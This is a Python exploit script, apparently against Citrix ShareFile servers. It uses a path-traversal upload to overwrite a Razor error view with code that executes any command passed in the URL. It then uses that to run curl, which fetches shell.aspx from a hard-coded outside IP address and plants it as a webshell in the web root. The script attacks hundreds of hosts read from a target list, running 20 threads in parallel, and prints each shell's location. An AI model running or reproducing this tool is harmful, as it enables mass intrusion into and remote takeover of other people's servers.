import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
import random,string
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#fofa: 
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'
def encode_multipart_formdata(files):
    boundary = "boundary"
    body = (
        "".join("--%s\r\n"
                "Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
                "\r\n"
                "%s\r\n" % (boundary, files['name'], files['filename'], files['content_file'])
                +"--%s--\r\n" % boundary
    ))
    content_type = "multipart/form-data; boundary=%s" % boundary
    return body, content_type

def exploit(ip_, index):
    try:
        content_file = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4096))
        files = {
            "name": "text4",
            "filename": "text5",
            "content_file": content_file
        }
        data, content_type = encode_multipart_formdata(files)
        headers = {"Content-Type": content_type}
        payload = "@using System.Diagnostics;@{int idx0= 0;string str_idx0 = idx0.ToString(); int idx1 = 1;string str_idx1 = idx1.ToString();string cmd = Request.QueryString[str_idx0];string arg = Request.QueryString[str_idx1];Process.Start(cmd,arg);}"
        params = {
            "uploadid": payload+'/../../ConfigService\Views\Shared\Error.cshtml',
            "bp": "123",
            "accountid": "123"
        }
        target = ip_ + "/upload.aspx"
        url = ip_+r'/upload.aspx?uploadid=%40using+System.Diagnostics%3B%40%7Bint+a%3D1%3Bint+b%3D2%3Bstring+cmd+%3D+Request.QueryString%5Ba.ToString%28%29%5D%3Bstring+arg+%3D+Request.QueryString%5Bb.ToString%28%29%5D%3BProcess+pro+%3D+new+Process%28%29%3Bpro.StartInfo.FileName+%3D+cmd%3Bpro.StartInfo.Arguments+%3D+arg%3Bpro.StartInfo.UseShellExecute+%3D+false%3Bpro.StartInfo.RedirectStandardError+%3D+true%3Bpro.StartInfo.RedirectStandardInput+%3D+true%3Bpro.StartInfo.RedirectStandardOutput+%3D+true%3Bpro.StartInfo.CreateNoWindow+%3D+true%3Bpro.Start%28%29%3Bstring+s+%3D+pro.StandardOutput.ReadToEnd%28%29%3BResponse.Clear%28%29%3BResponse.Write%28s%29%3BResponse.End%28%29%3B%7D%2F..%2F..%2FConfigService%5CViews%5CShared%5CError.cshtml&bp=123&accountid=123'
        burp0_headers = {"Content-Type": "multipart/form-data; boundary=boundary"}
        burp0_data = "--boundary\r\nContent-Disposition: form-data; name=\"text4\"; filename=\"text5\"\r\n\r\n4097*A\r\n--boundary--\r\n"
        # print(index,url)
        # res=requests.post(target, data=data, params=params, headers=headers, timeout=8, verify=False)
        res = requests.post(url, headers=burp0_headers, data=burp0_data, timeout=8, verify=False)
        print(res, len(res.text))
        print(index,ip_)
        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
        url_shell='http://39.101.76.53:8000/shell.aspx'
        target = "%s/configservice/Home/Error?0=CMD.exe&1=/C curl %s  -o \"C:\inetpub\wwwroot\Citrix\StorageCenter\%s.aspx\"" %(ip_,url_shell,filename)
        requests.get(target, timeout=8, verify=False)
        print(f"Your shell is located at {ip_}/{filename}.aspx" )
        # with result_path.open('a+') as file:
            # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass
# /configservice/Home/Error?0=CMD.exe&1=/C ping 
# url=''
# exploit(url,1)


threads = []
with open(r'D:\Downloads\tmp\sharefile.txt', 'r') as file:
    # with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 300
        end = start+700

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 20
# print(urls)

test = 'm'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()